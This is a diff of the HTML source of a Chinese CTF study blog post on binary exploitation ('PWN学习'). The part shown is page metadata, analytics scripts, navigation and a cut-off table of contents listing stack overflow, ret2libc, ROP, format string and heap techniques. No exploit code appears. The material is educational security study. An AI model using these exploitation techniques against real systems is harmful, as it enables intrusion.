@@ -1,262 +1,136 @@
 <!DOCTYPE html>
+<html lang="en">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
 
-  <html class="dark page-post">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
-<head>
-  <meta charset="utf-8">
-  
-  <title>PWN学习 | pz1o</title>
+<meta name="description" content="PWN学习"/><meta name="keywords" content="CTF" /><link rel="alternate" href="/atom.xml" title="pz1o"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://pz1o.top/2020/10/24/PWN学习/"/>
 
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" /><script type="text/x-mathjax-config">
+    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
+  </script>
+  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
 
-  
-    <meta name="keywords" content="PWN," />
-  
-
-  <meta name="description" content="PWN纯零基础，大佬请略过 从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论  大学中是研究深度还是广度，我可能还是需要选择一下 基本全是ppt截图 基础 1234gcc -S a.c #生成汇编文件file a.s #查看文件类型  可以看见是ascii文本gcc a.s  #生成可执行文件file a.out #可以看见是可执行文件  ELF文件">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PWN学习">
-<meta property="og:url" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/index.html">
-<meta property="og:site_name" content="pz1o">
-<meta property="og:description" content="PWN纯零基础，大佬请略过 从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论  大学中是研究深度还是广度，我可能还是需要选择一下 基本全是ppt截图 基础 1234gcc -S a.c #生成汇编文件file a.s #查看文件类型  可以看见是ascii文本gcc a.s  #生成可执行文件file a.out #可以看见是可执行文件  ELF文件">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png">
-<meta property="og:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png">
-<meta property="article:published_time" content="2020-10-24T14:32:31.000Z">
-<meta property="article:modified_time" content="2020-12-11T09:17:54.335Z">
-<meta property="article:author" content="pz1o">
-<meta property="article:tag" content="PWN">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg">
-
-  
-
-  
-    <link rel="icon" href="/favicon.ico">
-  
-
-  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
-
-
-  
-    
-<link rel="stylesheet" href="/css/personal-style.css">
-
-  
-
-  
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-ga('create', 'UA-38189205-1', 'auto');
-ga('send', 'pageview');
-
-</script>
-<!-- End Google Analytics -->
-
-
-  
-  <script type="text/javascript">
+<script id="baidu_analytics">
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "//hm.baidu.com/hm.js?e90b4c8b8c36ca2b3e5798ef67088f84";
+      hm.src = "https://hm.baidu.com/hm.js?e90b4c8b8c36ca2b3e5798ef67088f84";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
-  </script>
+  </script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
+  <script id="leancloud">
+    AV.init({
+      appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
+      appKey: "FL93w3BBbF9lxiR8X1HI58En"
+    });
+  </script><script>
+  window.config = {"leancloud":{"app_id":"KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz","app_key":"FL93w3BBbF9lxiR8X1HI58En"},"toc":true,"fancybox":true,"pjax":"","latex":true};
+</script>
 
-
-  
-  <script type="text/javascript">
-	(function(){
-	    var bp = document.createElement('script');
-	    var curProtocol = window.location.protocol.split(':')[0];
-	    if (curProtocol === 'https') {
-	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
-	    }
-	    else {
-	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-	    }
-	    var s = document.getElementsByTagName("script")[0];
-	    s.parentNode.insertBefore(bp, s);
-	})();
-  </script>
-
-
-
-  
-    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
-  
-
-<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="pz1o" type="application/atom+xml">
+    <title>PWN学习 - pz1o</title>
+  <meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="pz1o" type="application/atom+xml">
 </head>
 
-<body>
-
-
-  
-
-  <div class="post-header">
-   
-
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">pz1o</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
 </div>
 
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/archives/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">pz1o</a>
+</div>
 
-  <div id="toc" class="toc-article">
-    <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#基础"><span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF文件"><span class="toc-text">ELF文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#虚拟内存"><span class="toc-text">虚拟内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序编译与链接"><span class="toc-text">程序编译与链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序装载与进程执行"><span class="toc-text">程序装载与进程执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编指令"><span class="toc-text">汇编指令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#栈溢出基础"><span class="toc-text">栈溢出基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本原理"><span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击"><span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-text">ret2libc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#返回导向编程"><span class="toc-text">返回导向编程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础-1"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-1"><span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-text">x64</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#动态链接过程"><span class="toc-text">动态链接过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#保护措施"><span class="toc-text">保护措施</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RELRO"><span class="toc-text">RELRO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-NX-bits"><span class="toc-text">The NX bits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASLR"><span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary"><span class="toc-text">Canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE"><span class="toc-text">PIE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#栈迁移"><span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化字符串漏洞"><span class="toc-text">格式化字符串漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#堆"><span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是堆"><span class="toc-text">什么是堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆管理器"><span class="toc-text">堆管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arena"><span class="toc-text">arena</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk"><span class="toc-text">chunk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#malloced-chunk"><span class="toc-text">malloced chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free-chunk"><span class="toc-text">free chunk</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bin"><span class="toc-text">bin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache"><span class="toc-text">tcache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbins"><span class="toc-text">fastbins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin"><span class="toc-text">unsorted bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small-bins"><span class="toc-text">small bins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#large-bins"><span class="toc-text">large bins</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#堆漏洞"><span class="toc-text">堆漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#工具学习"><span class="toc-text">工具学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools"><span class="toc-text">pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb"><span class="toc-text">gdb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA"><span class="toc-text">IDA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget"><span class="toc-text">ROPgadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#one-gadget"><span class="toc-text">one_gadget</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#练习题"><span class="toc-text">练习题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text-1"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode-1"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc1"><span class="toc-text">ret2libc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc2"><span class="toc-text">ret2libc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#retlibc3"><span class="toc-text">retlibc3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2-x64"><span class="toc-text">pwn2_x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3-x64"><span class="toc-text">pwn3_x64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串"><span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fmtstr1"><span class="toc-text">fmtstr1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmstr2"><span class="toc-text">fmstr2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmstr-uaf"><span class="toc-text">fmstr_uaf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆-1"><span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#heap1"><span class="toc-text">heap1</span></a></li></ol></li></ol></li></ol>
-  </div>
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
 
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">PWN学习
+        </h1>
 
-
-<div class="content content-post CENTER">
-   <article id="post-PWN学习" class="article article-type-post" itemprop="blogPost">
-  <header class="article-header">
-    <h1 class="post-title">PWN学习</h1>
-
-    <div class="article-meta">
-      <span>
-        <i class="icon-calendar"></i>
-        <span>2020.10.24</span>
-      </span>
-
-      
-        <span class="article-author">
-          <i class="icon-user"></i>
-          <span>pz1o</span>
+      <div class="post-meta">
+        <span class="post-time">
+          2020-10-24
+        </span><span class="post-category">
+            <a href="/categories/PWN/">PWN</a>
+            </span>
+        <span class="post-visits"
+             data-url="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/"
+             data-title="PWN学习">
+          Visits 0
         </span>
-      
+        </div>
+    </header>
 
-      
-  <span class="article-category">
-    <i class="icon-list"></i>
-    <a class="article-category-link" href="/categories/PWN/">PWN</a>
-  </span>
-
-
-
-      
-
-      
-      <i class="fa fa-eye"></i> 
-        <span id="busuanzi_container_page_pv">
-           &nbsp热度 <span id="busuanzi_value_page_pv">
-           <i class="fa fa-spinner fa-spin"></i></span>℃
-        </span>
-      
-      
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#基础"><span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF文件"><span class="toc-text">ELF文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#虚拟内存"><span class="toc-text">虚拟内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序编译与链接"><span class="toc-text">程序编译与链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序装载与进程执行"><span class="toc-text">程序装载与进程执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编指令"><span class="toc-text">汇编指令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#栈溢出基础"><span class="toc-text">栈溢出基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本原理"><span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击"><span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-text">ret2libc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#返回导向编程"><span class="toc-text">返回导向编程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础-1"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 